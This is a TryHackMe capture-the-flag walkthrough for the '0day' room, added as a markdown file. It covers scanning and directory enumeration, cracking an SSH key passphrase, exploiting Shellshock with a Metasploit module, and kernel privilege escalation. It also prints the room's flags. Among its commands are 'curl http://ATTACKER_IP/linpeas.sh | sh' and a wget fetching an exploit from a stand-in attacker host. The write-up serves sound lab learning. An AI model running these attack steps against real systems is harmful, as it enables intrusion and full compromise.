@@ -1,0 +1,364 @@
+# 🔥 TryHackMe - 0day
+
+> Difficulty: Easy
+>
+> Topics Covered:
+> - Web Enumeration
+> - Backup File Discovery
+> - SSH Key Analysis
+> - Shellshock (CVE-2014-6271)
+> - Linux Privilege Escalation
+> - Kernel Exploitation
+
+---
+
+# 🎯 TL;DR
+
+| Stage | Result |
+|---------|---------|
+| Recon | Found `/backup` and `/cgi-bin` |
+| Rabbit Hole | Encrypted SSH key |
+| Initial Access | Shellshock RCE |
+| User Flag | `THM{Sh3llSh0ck_r0ckz}` |
+| PrivEsc | Kernel Exploit |
+| Root Flag | `THM{g00d_j0b_0day_is_Pleased}` |
+
+---
+
+# 🧭 Overview
+
+This machine initially appeared to revolve around an exposed SSH private key hidden inside a backup directory.
+
+After spending some time attempting to crack and use the key, it became clear that the real attack path was elsewhere.
+
+The breakthrough came from investigating the CGI directory and identifying a classic Shellshock vulnerability which ultimately provided remote code execution.
+
+From there, kernel enumeration revealed a viable privilege escalation path leading to root.
+
+---
+
+# 🔍 Reconnaissance
+
+## Port Scan
+
+Started with RustScan:
+
+```bash
+rustscan -a 10.49.181.37 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
+```
+
+### Results
+
+| Port | Service | Version |
+|--------|---------|---------|
+| 22 | SSH | OpenSSH 6.6.1 |
+| 80 | HTTP | Apache 2.4.7 |
+
+Interesting page title:
+
+```text
+0day
+```
+
+---
+
+## Directory Enumeration
+
+Using Feroxbuster:
+
+```bash
+feroxbuster -u http://10.49.181.37/ \
+-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+-x php,txt,html
+```
+
+### Interesting Findings
+
+```text
+/cgi-bin/
+/backup/
+/uploads/
+/admin/
+```
+
+---
+
+# 🚧 Rabbit Hole: The SSH Key
+
+Inside `/backup` I found an encrypted RSA private key.
+
+At first this looked like the intended path.
+
+### Crack the Passphrase
+
+```bash
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+Result:
+
+```text
+letmein
+```
+
+Success!
+
+...or so I thought.
+
+---
+
+## ❌ What Failed
+
+Tried:
+
+```bash
+ssh 0day@TARGET -i id_rsa
+```
+
+and
+
+```bash
+ssh ryan@TARGET -i id_rsa
+```
+
+Neither worked.
+
+Despite recovering the passphrase, authentication still failed.
+
+### Lesson
+
+Not every credential you discover is useful.
+
+Sometimes it's:
+
+- Old
+- Misconfigured
+- Deliberate bait
+
+---
+
+# 💡 Breakthrough Moment
+
+Nikto revealed something much more interesting:
+
+```bash
+nikto -h TARGET
+```
+
+Finding:
+
+```text
+/cgi-bin/
+```
+
+Immediately suspicious.
+
+Older CGI applications often lead to:
+
+- Shellshock
+- Command Injection
+- Legacy CGI vulnerabilities
+
+This completely changed the attack path.
+
+---
+
+# 💥 Initial Access - Shellshock
+
+### Why Shellshock Matters
+
+Shellshock (CVE-2014-6271) is a Bash vulnerability allowing attackers to execute commands through specially crafted environment variables.
+
+If a CGI script passes user-controlled data into Bash:
+
+💀 Remote Code Execution.
+
+---
+
+## Exploitation
+
+Metasploit made quick work of it.
+
+```bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+set RHOSTS 10.49.181.37
+set TARGETURI /cgi-bin/test.cgi
+set LHOST YOUR_IP
+
+exploit
+```
+
+### Shell Obtained
+
+```bash
+uid=33(www-data)
+```
+
+Shell upgraded:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+# 🚩 User Flag
+
+Discovered:
+
+```bash
+/home/ryan/user.txt
+```
+
+Flag:
+
+```text
+THM{Sh3llSh0ck_r0ckz}
+```
+
+---
+
+# 🔺 Privilege Escalation
+
+Time to become root.
+
+---
+
+## LinPEAS Enumeration
+
+```bash
+curl http://ATTACKER_IP/linpeas.sh | sh
+```
+
+Among many findings:
+
+```text
+CVE-2015-3290
+espfix64_NMI
+```
+
+Looked promising.
+
+---
+
+# 🤦 Beginner Mistake
+
+Downloaded exploit:
+
+```bash
+wget http://ATTACKER_IP/37292.c
+```
+
+Then attempted:
+
+```bash
+./37292.c
+```
+
+Which obviously failed.
+
+A `.c` file is source code.
+
+It must be compiled first.
+
+---
+
+# ✅ Actual Exploitation
+
+Compile:
+
+```bash
+gcc 37292.c -o 37292
+```
+
+Run:
+
+```bash
+./37292
+```
+
+Result:
+
+```bash
+uid=0(root)
+```
+
+Root shell obtained.
+
+---
+
+# 👑 Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+```text
+THM{g00d_j0b_0day_is_Pleased}
+```
+
+---
+
+# 🧠 Key Takeaways
+
+### Enumeration Beats Assumptions
+
+I spent time attacking the SSH key because it looked important.
+
+The real attack path was hidden elsewhere.
+
+---
+
+### Always Investigate CGI
+
+Finding:
+
+```text
+/cgi-bin/
+```
+
+should immediately trigger further investigation.
+
+Especially on older Apache servers.
+
+---
+
+### Shellshock Still Matters
+
+Although old, Shellshock remains one of the most devastating web vulnerabilities ever discovered.
+
+Category:
+
+- OWASP Injection
+- Remote Code Execution
+
+---
+
+### Learn From Mistakes
+
+Trying to execute a `.c` file directly is a classic beginner error.
+
+Remember:
+
+```bash
+gcc exploit.c -o exploit
+./exploit
+```
+
+---
+
+# 🏁 Conclusion
+
+This room was a great reminder that penetration testing is often about avoiding tunnel vision.
+
+The SSH key looked like the answer.
+
+It wasn't.
+
+The real path involved:
+
+`Enumeration ➜ CGI Discovery ➜ Shellshock ➜ www-data ➜ Kernel Exploit ➜ Root`
+
+A fun machine that teaches both web exploitation and Linux privilege escalation fundamentals.
